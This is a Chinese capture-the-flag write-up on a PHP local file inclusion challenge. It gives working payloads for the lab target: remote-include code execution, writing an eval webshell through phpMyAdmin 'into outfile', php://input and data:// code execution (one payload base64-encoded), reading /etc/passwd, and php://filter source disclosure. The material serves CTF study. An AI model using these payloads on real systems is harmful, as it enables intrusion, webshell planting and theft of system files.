# 题目

    
    
    <?php
    show_source(__FILE__);
    echo $_GET['hello'];
    $page=$_GET['page'];
    while (strstr($page, "php://")) {
        $page=str_replace("php://", "", $page);
    }
    include($page);
    ?>
    

# hello传值

    
    
    ?page=http://127.0.0.1/?hello=<?php%system("ls");?>
    ?page=http://127.0.0.1/?hello=<?php%show_source("fl4gisisish3r3.php");?>
    

# phpmyadmin写马

> 路径扫描能找到phpmyadmin

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428568_62bb1818b380b7c117ff2.png!small)

> 账号root 密码为空

==phpmyadmin变量secure_file_priv值为空，说明可以写入一句话木马==

    
    
    show variables like "secure_file_priv";
    

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428569_62bb18199afd156404cf4.png!small)

==传ma成功==

    
    
    select "<?php eval($_POST[1]); ?>"into outfile '/tmp/1.php'
    

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428570_62bb181a961c3a69944a8.png!small)

==测试ma==

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428572_62bb181c2089b1400af12.png!small)

# 大写绕过 PHP://input

==php://input== 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行

利用该方法，我们可以直接写入php文件，输入file=php://input，然后使用burp抓包，写入php代码：

    
    
    <?php system("ls");?>
    

![在这里插入图片描述](https://image.3001.net/images/20220628/1656428573_62bb181d86fcf231bd0e4.png!small)

# data://

通常可以用来执行PHP代码

    
    
    ?page=data://text/plain,<?php system("ls")?>
    
    
    
    ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=
    

# file://协议

用于访问本地文件系统，不受allow_url_fopen与allow_url_include的影响

即file:// [文件的绝对路径和文件名]

    
    
    ?page=file:///etc/passwd
    

# php://filter/read

经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行

    
    
    ?page=phP://filter/read=convert.base64-encode/resource=index.php
    

